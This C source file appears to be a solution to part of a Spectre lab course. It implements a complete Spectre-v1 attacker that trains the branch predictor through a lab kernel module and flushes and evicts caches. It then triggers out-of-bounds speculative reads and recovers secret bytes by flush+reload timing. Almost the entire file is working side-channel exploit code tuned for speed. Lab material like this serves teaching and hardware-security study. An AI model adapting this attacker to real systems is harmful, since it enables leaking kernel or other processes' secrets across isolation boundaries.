#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <stdint.h>
#include <string.h>

#include "labspectre.h"
#include "labspectreipc.h"

// Tuned thresholds for speed
#define CACHE_HIT_THRESHOLD 105
#define NUM_TRIALS 150      // Reduced from 5000 to drastically speed up scoring
#define NUM_TRAIN_CALLS 10  // Fewer training loops required

// Skylake typically has a 1 MiB private L2 cache per core.
// Using a 1MB buffer with a 4096 stride quickly clears the local L1/L2 caches
// instead of slowly iterating 4MB sequentially.
#define EVICT_BUF_SIZE (1 * 1024 * 1024)
#define EVICT_STRIDE 4096

static inline void call_kernel_part3(int kernel_fd, char *shared_memory, size_t offset) {
    spectre_lab_command local_cmd;
    local_cmd.kind = COMMAND_PART3;
    local_cmd.arg1 = (uint64_t)shared_memory;
    local_cmd.arg2 = offset;
    write(kernel_fd, (void *)&local_cmd, sizeof(local_cmd));
}

// 3. Memory: Selective flush (only flush the 256 array indices used for the side-channel)
static void flush_target_memory(char *shared_memory) {
    for (int i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        clflush(&shared_memory[i * SHD_SPECTRE_LAB_PAGE_SIZE]);
    }
}

static void reload_and_score(char *shared_memory, int *scores) {
    for (int i = 0; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        int idx = ((i * 167) + 13) % SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES;
        uint64_t t = time_access(&shared_memory[idx * SHD_SPECTRE_LAB_PAGE_SIZE]);
        if (t < CACHE_HIT_THRESHOLD) {
            scores[idx]++;
        }
    }
}

// 2. Cache Prep: Faster targeted eviction via strided memory access
static void evict_cache(char *evict_buf, size_t len) {
    volatile unsigned char sink = 0;
    // Paging stride eviction (much faster than a full sequential scan)
    for (size_t i = 0; i < len; i += EVICT_STRIDE) {
        sink ^= evict_buf[i];
    }
    (void)sink;
}

static unsigned char leak_byte(int kernel_fd, char *shared_memory, char *evict_buf, size_t offset) {
    int scores[SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES];
    memset(scores, 0, sizeof(scores));

    for (int trial = 0; trial < NUM_TRIALS; trial++) {

        // 1. Training: Use fewer calls to train the Branch Predictor
        for (int t = 0; t < NUM_TRAIN_CALLS; t++) {
            call_kernel_part3(kernel_fd, shared_memory, t % 4);
        }

        // Flush target memory AFTER training to keep the signal completely clean
        flush_target_memory(shared_memory);

        // Evict L1/L2 caches rapidly using the stride approach
        evict_cache(evict_buf, EVICT_BUF_SIZE);

        __asm__ volatile("mfence" ::: "memory");

        // Single attack call with out-of-bounds offset
        call_kernel_part3(kernel_fd, shared_memory, offset);

        __asm__ volatile("mfence" ::: "memory");

        // 4. Scoring: Process the fast signals
        reload_and_score(shared_memory, scores);
    }

    // Find best score, skip index 0 (common noise source in Spectre attacks)
    int best = 1;
    for (int i = 2; i < SHD_SPECTRE_LAB_SHARED_MEMORY_NUM_PAGES; i++) {
        if (scores[i] > scores[best]) {
            best = i;
        }
    }
    return (unsigned char)best;
}

int run_attacker(int kernel_fd, char *shared_memory) {
    char leaked_str[SHD_SPECTRE_LAB_SECRET_MAX_LEN];
    size_t current_offset = 0;

    printf("Launching attacker\n");

    char *evict_buf = malloc(EVICT_BUF_SIZE);
    if (!evict_buf) { perror("malloc"); close(kernel_fd); return EXIT_FAILURE; }
    
    // Page-in the eviction buffer memory
    memset(evict_buf, 1, EVICT_BUF_SIZE);

    init_shared_memory(shared_memory, SHD_SPECTRE_LAB_SHARED_MEMORY_SIZE);

    for (current_offset = 0; current_offset < SHD_SPECTRE_LAB_SECRET_MAX_LEN - 1; current_offset++) {
        unsigned char leaked_byte = leak_byte(kernel_fd, shared_memory, evict_buf, current_offset);

        printf("[+] Offset %zu: 0x%02x ('%c')\n", current_offset, leaked_byte,
               (leaked_byte >= 32 && leaked_byte < 127) ? leaked_byte : '.');

        leaked_str[current_offset] = (char)leaked_byte;
        if (leaked_byte == '\0') break;
    }
    leaked_str[current_offset] = '\0';

    printf("\n\n[Part 3] We leaked:\n%s\n", leaked_str);

    free(evict_buf);
    close(kernel_fd);
    return EXIT_SUCCESS;
}